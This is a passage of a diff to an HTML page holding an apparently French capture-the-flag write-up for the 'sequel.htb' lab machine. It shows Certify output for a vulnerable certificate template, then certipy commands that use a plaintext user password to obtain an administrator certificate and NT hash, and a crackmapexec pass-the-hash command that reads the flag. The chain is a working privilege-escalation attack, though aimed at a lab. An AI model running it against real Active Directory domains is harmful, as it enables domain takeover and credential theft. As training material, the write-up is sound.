+</span><span id="__span-14-36"><a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a>      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">sequel</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">512</span>
+</span><span id="__span-14-37"><a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a>      <span class="n">Allow</span>  <span class="n">ManageCA</span><span class="p">,</span> <span class="n">ManageCertificates</span>               <span class="n">sequel</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>      <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">519</span>
+</span><span id="__span-14-38"><a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a>    <span class="n">Enrollment</span> <span class="n">Agent</span> <span class="n">Restrictions</span> <span class="p">:</span> <span class="n">None</span>
+</span><span id="__span-14-39"><a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a>
+</span><span id="__span-14-40"><a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a><span class="p">[!]</span> <span class="n">Vulnerable</span> <span class="n">Certificates</span> <span class="n">Templates</span> <span class="p">:</span>
+</span><span id="__span-14-41"><a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a>
+</span><span id="__span-14-42"><a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a>    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">dc</span><span class="p">.</span><span class="n">sequel</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">sequel-DC-CA</span>
+</span><span id="__span-14-43"><a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a>    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">UserAuthentication</span>
+</span><span id="__span-14-44"><a id="__codelineno-14-44" name="__codelineno-14-44" href="#__codelineno-14-44"></a>    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="n">2</span>
+</span><span id="__span-14-45"><a id="__codelineno-14-45" name="__codelineno-14-45" href="#__codelineno-14-45"></a>    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="n">10</span> <span class="n">years</span>
+</span><span id="__span-14-46"><a id="__codelineno-14-46" name="__codelineno-14-46" href="#__codelineno-14-46"></a>    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="n">6</span> <span class="n">weeks</span>
+</span><span id="__span-14-47"><a id="__codelineno-14-47" name="__codelineno-14-47" href="#__codelineno-14-47"></a>    <span class="n">msPKI-Certificate-Name-Flag</span>          <span class="p">:</span> <span class="n">ENROLLEE_SUPPLIES_SUBJECT</span>
+</span><span id="__span-14-48"><a id="__codelineno-14-48" name="__codelineno-14-48" href="#__codelineno-14-48"></a>    <span class="n">mspki-enrollment-flag</span>                 <span class="p">:</span> <span class="n">INCLUDE_SYMMETRIC_ALGORITHMS</span><span class="p">,</span> <span class="n">PUBLISH_TO_DS</span>
+</span><span id="__span-14-49"><a id="__codelineno-14-49" name="__codelineno-14-49" href="#__codelineno-14-49"></a>    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="n">0</span>
+</span><span id="__span-14-50"><a id="__codelineno-14-50" name="__codelineno-14-50" href="#__codelineno-14-50"></a>    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+</span><span id="__span-14-51"><a id="__codelineno-14-51" name="__codelineno-14-51" href="#__codelineno-14-51"></a>    <span class="n">mspki-certificate-application-policy</span>  <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span><span class="p">,</span> <span class="n">Encrypting</span> <span class="n">File</span> <span class="n">System</span><span class="p">,</span> <span class="n">Secure</span> <span class="n">Email</span>
+</span><span id="__span-14-52"><a id="__codelineno-14-52" name="__codelineno-14-52" href="#__codelineno-14-52"></a>    <span class="n">Permissions</span>
+</span><span id="__span-14-53"><a id="__codelineno-14-53" name="__codelineno-14-53" href="#__codelineno-14-53"></a>      <span class="n">Enrollment</span> <span class="n">Permissions</span>
+</span><span id="__span-14-54"><a id="__codelineno-14-54" name="__codelineno-14-54" href="#__codelineno-14-54"></a>        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">sequel</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">512</span>
+</span><span id="__span-14-55"><a id="__codelineno-14-55" name="__codelineno-14-55" href="#__codelineno-14-55"></a>                                      <span class="n">sequel</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Users</span>           <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">513</span>
+</span><span id="__span-14-56"><a id="__codelineno-14-56" name="__codelineno-14-56" href="#__codelineno-14-56"></a>                                      <span class="n">sequel</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>      <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">519</span>
+</span><span id="__span-14-57"><a id="__codelineno-14-57" name="__codelineno-14-57" href="#__codelineno-14-57"></a>      <span class="n">Object</span> <span class="n">Control</span> <span class="n">Permissions</span>
+</span><span id="__span-14-58"><a id="__codelineno-14-58" name="__codelineno-14-58" href="#__codelineno-14-58"></a>        <span class="n">Owner</span>                       <span class="p">:</span> <span class="n">sequel</span><span class="p">\</span><span class="n">Administrator</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">500</span>
+</span><span id="__span-14-59"><a id="__codelineno-14-59" name="__codelineno-14-59" href="#__codelineno-14-59"></a>        <span class="n">WriteOwner</span> <span class="n">Principals</span>       <span class="p">:</span> <span class="n">sequel</span><span class="p">\</span><span class="n">Administrator</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">500</span>
+</span><span id="__span-14-60"><a id="__codelineno-14-60" name="__codelineno-14-60" href="#__codelineno-14-60"></a>                                      <span class="n">sequel</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">512</span>
+</span><span id="__span-14-61"><a id="__codelineno-14-61" name="__codelineno-14-61" href="#__codelineno-14-61"></a>                                      <span class="n">sequel</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>      <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">519</span>
+</span><span id="__span-14-62"><a id="__codelineno-14-62" name="__codelineno-14-62" href="#__codelineno-14-62"></a>        <span class="n">WriteDacl</span> <span class="n">Principals</span>        <span class="p">:</span> <span class="n">sequel</span><span class="p">\</span><span class="n">Administrator</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">500</span>
+</span><span id="__span-14-63"><a id="__codelineno-14-63" name="__codelineno-14-63" href="#__codelineno-14-63"></a>                                      <span class="n">sequel</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">512</span>
+</span><span id="__span-14-64"><a id="__codelineno-14-64" name="__codelineno-14-64" href="#__codelineno-14-64"></a>                                      <span class="n">sequel</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>      <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">519</span>
+</span><span id="__span-14-65"><a id="__codelineno-14-65" name="__codelineno-14-65" href="#__codelineno-14-65"></a>        <span class="n">WriteProperty</span> <span class="n">Principals</span>    <span class="p">:</span> <span class="n">sequel</span><span class="p">\</span><span class="n">Administrator</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">500</span>
+</span><span id="__span-14-66"><a id="__codelineno-14-66" name="__codelineno-14-66" href="#__codelineno-14-66"></a>                                      <span class="n">sequel</span><span class="p">\</span><span class="n">Domain</span> <span class="n">Admins</span>          <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">512</span>
+</span><span id="__span-14-67"><a id="__codelineno-14-67" name="__codelineno-14-67" href="#__codelineno-14-67"></a>                                      <span class="n">sequel</span><span class="p">\</span><span class="n">Enterprise</span> <span class="n">Admins</span>      <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">4078382237</span><span class="p">-</span><span class="n">1492182817</span><span class="p">-</span><span class="n">2568127209</span><span class="p">-</span><span class="n">519</span>
+</span><span id="__span-14-68"><a id="__codelineno-14-68" name="__codelineno-14-68" href="#__codelineno-14-68"></a>
+</span><span id="__span-14-69"><a id="__codelineno-14-69" name="__codelineno-14-69" href="#__codelineno-14-69"></a>
+</span><span id="__span-14-70"><a id="__codelineno-14-70" name="__codelineno-14-70" href="#__codelineno-14-70"></a>
+</span><span id="__span-14-71"><a id="__codelineno-14-71" name="__codelineno-14-71" href="#__codelineno-14-71"></a><span class="n">Certify</span> <span class="n">completed</span> <span class="k">in</span> <span class="n">00</span><span class="p">:</span><span class="n">00</span><span class="p">:</span><span class="n">09</span><span class="p">.</span><span class="n">2906146</span>
+</span></code></pre></div>
 <p>Donc, on a effectivement un certificat qui est vulnérable : on devrait pouvoir request ce certificat sous le nom de l'administrateur et pouvoir faire quelque-chose :).</p>
 <p>Et en fait ça ne marche pas. Pourquoi ? Parce-qu'il faut que la date et l'heure soient synchronisés au DC ! Une galère de comprendre le problème.</p>
-<pre><code class="language-bash">pak@kali:~$ sudo ntpdate -u dc.sequel.htb
-2023-10-14 23:48:42.383269 (+0200) +28799.624267 +/- 0.006328 dc.sequel.htb 10.129.81.126 s1 no-leap
-CLOCK: time stepped by 28799.624267
-</code></pre>
-<pre><code class="language-bash">pak@kali:~$ certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication
-Certipy v4.7.0 - by Oliver Lyak (ly4k)
-
-[*] Requesting certificate via RPC
-[*] Successfully requested certificate
-[*] Request ID is 12
-[*] Got certificate with UPN 'administrator@sequel.htb'
-[*] Certificate has no object SID
-[*] Saved certificate and private key to 'administrator.pfx'
-</code></pre>
-<pre><code class="language-bash">pak@kali:~$ certipy-ad auth -pfx administrator.pfx
-Certipy v4.7.0 - by Oliver Lyak (ly4k)
-
-[*] Using principal: administrator@sequel.htb
-[*] Trying to get TGT...
-[*] Got TGT
-[*] Saved credential cache to 'administrator.ccache'
-[*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
-
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>pak@kali:~$<span class="w"> </span>sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span>dc.sequel.htb
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="m">2023</span>-10-14<span class="w"> </span><span class="m">23</span>:48:42.383269<span class="w"> </span><span class="o">(</span>+0200<span class="o">)</span><span class="w"> </span>+28799.624267<span class="w"> </span>+/-<span class="w"> </span><span class="m">0</span>.006328<span class="w"> </span>dc.sequel.htb<span class="w"> </span><span class="m">10</span>.129.81.126<span class="w"> </span>s1<span class="w"> </span>no-leap
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>CLOCK:<span class="w"> </span><span class="nb">time</span><span class="w"> </span>stepped<span class="w"> </span>by<span class="w"> </span><span class="m">28799</span>.624267
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>pak@kali:~$<span class="w"> </span>certipy-ad<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span>ryan.cooper@sequel.htb<span class="w"> </span>-p<span class="w"> </span>NuclearMosquito3<span class="w"> </span>-upn<span class="w"> </span>administrator@sequel.htb<span class="w"> </span>-target<span class="w"> </span>sequel.htb<span class="w"> </span>-ca<span class="w"> </span>sequel-dc-ca<span class="w"> </span>-template<span class="w"> </span>UserAuthentication
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Requesting<span class="w"> </span>certificate<span class="w"> </span>via<span class="w"> </span>RPC
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Successfully<span class="w"> </span>requested<span class="w"> </span>certificate
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Request<span class="w"> </span>ID<span class="w"> </span>is<span class="w"> </span><span class="m">12</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>certificate<span class="w"> </span>with<span class="w"> </span>UPN<span class="w"> </span><span class="s1">&#39;administrator@sequel.htb&#39;</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Certificate<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>object<span class="w"> </span>SID
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>certificate<span class="w"> </span>and<span class="w"> </span>private<span class="w"> </span>key<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;administrator.pfx&#39;</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>pak@kali:~$<span class="w"> </span>certipy-ad<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Certipy<span class="w"> </span>v4.7.0<span class="w"> </span>-<span class="w"> </span>by<span class="w"> </span>Oliver<span class="w"> </span>Lyak<span class="w"> </span><span class="o">(</span>ly4k<span class="o">)</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>principal:<span class="w"> </span>administrator@sequel.htb
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>TGT...
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span>TGT
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saved<span class="w"> </span>credential<span class="w"> </span>cache<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;administrator.ccache&#39;</span>
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span>to<span class="w"> </span>retrieve<span class="w"> </span>NT<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;administrator&#39;</span>
+</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Got<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;administrator@sequel.htb&#39;</span>:<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+</span></code></pre></div>
 <p>On a le hash admin, plus qu'à aller récupérer le flag :) !</p>
-<pre><code class="language-bash">pak@kali:~$ crackmapexec smb sequel.htb -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee' -X 'type C:\Users\administrator\Desktop\root.txt'
-SMB         dc.sequel.htb   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
-SMB         dc.sequel.htb   445    DC               [+] sequel.htb\administrator:a52f78e4c751e5f5e17e1e9f3e58f4ee (Pwn3d!)
-SMB         dc.sequel.htb   445    DC               [+] Executed command 
-SMB         dc.sequel.htb   445    DC               d53dd2e96d89f754ef6011361c07d015
-
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>pak@kali:~$<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span>sequel.htb<span class="w"> </span>-u<span class="w"> </span>administrator<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;a52f78e4c751e5f5e17e1e9f3e58f4ee&#39;</span><span class="w"> </span>-X<span class="w"> </span><span class="s1">&#39;type C:\Users\administrator\Desktop\root.txt&#39;</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>SMB<span class="w">         </span>dc.sequel.htb<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span>.0<span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>SMB<span class="w">         </span>dc.sequel.htb<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\a</span>dministrator:a52f78e4c751e5f5e17e1e9f3e58f4ee<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>SMB<span class="w">         </span>dc.sequel.htb<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Executed<span class="w"> </span><span class="nb">command</span><span class="w"> </span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>SMB<span class="w">         </span>dc.sequel.htb<span class="w">   </span><span class="m">445</span><span class="w">    </span>DC<span class="w">               </span>d53dd2e96d89f754ef6011361c07d015
+</span></code></pre></div>
 
 
 
@@ -8103,7 +8095,7 @@ SMB         dc.sequel.htb   445    DC               d53dd2e96d89f754ef6011361c07
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
